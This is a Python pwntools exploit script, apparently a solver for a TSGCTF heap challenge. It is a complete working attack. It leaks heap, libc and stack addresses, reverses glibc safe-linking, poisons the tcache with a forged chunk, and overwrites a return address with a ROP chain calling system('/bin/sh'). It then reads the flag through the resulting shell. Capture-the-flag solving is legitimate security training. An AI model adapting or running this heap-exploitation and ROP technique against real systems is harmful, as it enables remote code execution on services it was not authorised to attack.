import random
from pwn import *
import argparse
import time


context.arch = 'amd64'
context.log_level = 'error'

host = sys.argv[1]
port = int(sys.argv[2])

# host = "127.0.0.1"
# port = 3001

if host in ["127.0.0.1", "localhost"]:
    is_gaibu = False
else:
    is_gaibu = True
is_gaibu = False
log = False


def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


def main():
    r = remote(host, port)

    def recvuntil(x, verbose=True):
        if type(x) == str:
            x = x.encode("ascii")
        s = r.recvuntil(x)
        if log and verbose:
            print(s)
        return s.strip(x)

    def recv(n, verbose=True):
        s = r.recv(n)
        if log and verbose:
            print(s)
        return s

    def recvline(verbose=True):
        s = r.recvline()
        if log and verbose:
            print(s)
        return s.strip(b'\n')

    def sendline(s, verbose=True):
        if type(s) == str:
            s = s.encode("ascii")
        if log and verbose:
            print(s)
        r.sendline(s)

    def send(s, verbose=True):
        if type(s) == str:
            s = s.encode("ascii")
        if log and verbose:
            print(s, end='')
        r.send(s)

    def interactive():
        r.interactive()

    # libc safe linking decrypt

    def decrypt(cipher):
        key = 0
        plain = 0
        for i in range(1, 6):
            bits = 64 - 12 * i
            if bits < 0:
                bits = 0
            plain = ((cipher ^ key) >> bits) << bits
            key = plain >> 12
        return plain

    def encrypt(val, addr):
        return val ^ (addr >> 12)

    ####################################

    def menu(choice):
        recvuntil(b':')
        sendline(str(choice))

    # receive and send

    def rs(s, new_line=True, r=b': '):
        recvuntil(r)
        # s = str(s)
        if new_line:
            sendline(s)
        else:
            send(s)

    # send `s` after r

    def sa(r, s, new_line=True):
        rs(s, new_line, r)

    def post(t):
        recvuntil(b"> ")
        sendline("1")
        recvuntil(b"> ")
        sendline(t)

    def undo():
        recvuntil(b"> ")
        sendline("2")

    def pin(id):
        recvuntil(b"> ")
        sendline("3")

        recvuntil(b"> ")
        sendline(str(id))

    def show():
        recvuntil(b"> ")
        sendline("4")
        return recvline()

    def modify(t):
        recvuntil(b"> ")
        sendline("5")
        recvuntil(b"> ")
        sendline(t)

    def move_minus(diff):
        recvuntil(b"> ")
        sendline("6")
        recvuntil(b"> ")
        sendline("0")
        recvuntil(b"> ")
        sendline(str(diff))

    def move_plus(diff):
        recvuntil(b"> ")
        sendline("6")
        recvuntil(b"> ")
        sendline("1")
        recvuntil(b"> ")
        sendline(str(diff))

    def bye():
        recvuntil(b"> ")
        sendline("7")

    # post("DEADBEEF")

    # leak heap
    nbuf = 4
    for i in range(nbuf):
        post("DEADBEEFDEADBEE" + str(i))
    move_minus(2 ** 64 - 2)
    for i in range(nbuf):
        undo()

    s = show()
    data = u64(s[:8])
    heap_base = decrypt(data) - 0x2c80
    print("[+] heap_base: ", hex(heap_base))

    # leak libc
    nbuf = 9
    for i in range(nbuf):
        post("D" * 223 + str(i))

    for i in range(nbuf):
        undo()

    s = show()
    libc_base = u64(s[:8]) - 0x219ce0
    print("[+] libc_base: ", hex(libc_base))

    if is_gaibu:
        # environ = libc_base + 0x2cc2d0
        environ = libc_base + 0x221200
        binsh = libc_base + 0x1d8698
        system = libc_base + 0x50d60
        pop_rdi = libc_base + 0x2a3e5
        ret = pop_rdi + 1
    else:
        environ = libc_base + 0x221200
        system = libc_base + 0x50d70
        pop_rdi = libc_base + 0x2a3e5
        ret = pop_rdi + 1
        binsh = libc_base + 0x1d8698

    for i in range(5):
        post("D" * 223 + str(i))

    fake_chunk_addr = heap_base + 0x34e0
    fake_chunk = [
        0,	0xf1,
        encrypt(0x3240 + heap_base, fake_chunk_addr + 0x10), 	0,
        # 0x7fffffffffffffff, 0
    ]
    fake_chunk = b"HOGEFUGA" + b"W" * \
        (0xe0 - 0x20 - 8) + b''.join(map(p64, fake_chunk))
    print(len(fake_chunk))
    post(fake_chunk)
    print("[+] fake_chunk_addr: ", hex(fake_chunk_addr))
    array_addr = fake_chunk_addr + 0x20
    print("[+] array: ", hex(array_addr))

    # leak stack
    for i in range(6):
        undo()

    s = show()
    data = u64(s[:8])
    nyao = data
    print("[+] nyao: ", hex(nyao))
    print("[+] decrypted: ", hex(decrypt(nyao)))

    modify(p64(encrypt(fake_chunk_addr + 0x10, heap_base + 0x3060)))

    post("D" * 223 + str(i))
    post("D" * 223 + str(i))

    def get_chunk(x):
        return (p64(0xe0) + p64(x) + p64(0xe0))

    chunks = [heap_base + 0x3518, environ, environ, array_addr,
              heap_base + 0x3340]

    payload = b"K" * (4 * 8) + b''.join(map(get_chunk, chunks))
    print(payload)
    assert (len(payload) < 0xe0)
    print(hex(len(payload)))
    post(payload + b"K" * (0xe0 - len(payload)))

    s = show()
    stack_addr = u64(s[:8])
    print("[+] stack_addr: ", hex(stack_addr))

    ret_addr = stack_addr - 0x2b0
    print("[+] ret_addr: ", hex(ret_addr))
    # => 0x55a47ff3c5bc <ghost::main+1676>:	ret
    # 0x35bc

    if ret_addr % 16 == 8:
        pad = b"K" * 8
        ret_addr -= 8

    # pin(3)
    #
    # chunks = [heap_base + 0x3518, environ,
    #          array_addr, ret_addr, heap_base + 0x3420]
    # payload = b''.join(map(get_chunk, chunks))[8:]
    #
    # modify(payload + b"K" * (0xe0 - len(payload)))

    # pin(2)
    payload = [
        ret,
        ret,
        pop_rdi,
        binsh,
        system
    ]
    # wait_for_attach()
    # modify(b''.join(map(p64, payload)))
    #
    # pin(1)
    #
    #
    # chunks = [0, 0, 0, 0, 0]
    # payload = b''.join(map(get_chunk, chunks))
    # modify(payload + b"K" * (0xe0 - len(payload)))

    post("d" * 47 + str(1))
    post("d" * 47 + str(2))
    post("d" * 47 + str(3))
    print("d: ", len("d" * 47 + str(3)))

    pin(0)
    move_minus(2 ** 64 - 4)
    print("kue, ", show())

    undo()
    undo()
    undo()

    modify(p64(encrypt(ret_addr, heap_base + 0x2d90)))
    payload = [
        # ret,
        ret,
        ret,
        pop_rdi,
        binsh,
        system
    ]

    payload = b''.join(map(p64, payload))
    assert (len(payload) < 48)
    payload += b"K" * (48 - len(payload))
    print("e: ", len(payload))
    post(payload)
    post(payload)

    pin(3)
    chunks = [0, 0, 0, 0, 0, 0, 0]
    payload = b''.join(map(get_chunk, chunks))
    modify(payload + b"K" * (0xe0 - len(payload)))

    bye()
    sendline("cat flag* && echo ")
    sendline("cat flag* && echo ")
    sendline("cat flag* && echo")
    recvline()
    flag = recvline().decode("ascii")
    print(flag)
    import re
    return re.match("TSGCTF{.*}", flag) is not None


flag = False
for i in range(3):
    try:
        if main():
            flag = True
            break
    except:
        pass
if flag:
    print("success")
    exit(0)
else:
    print("failed")
    exit(-1)
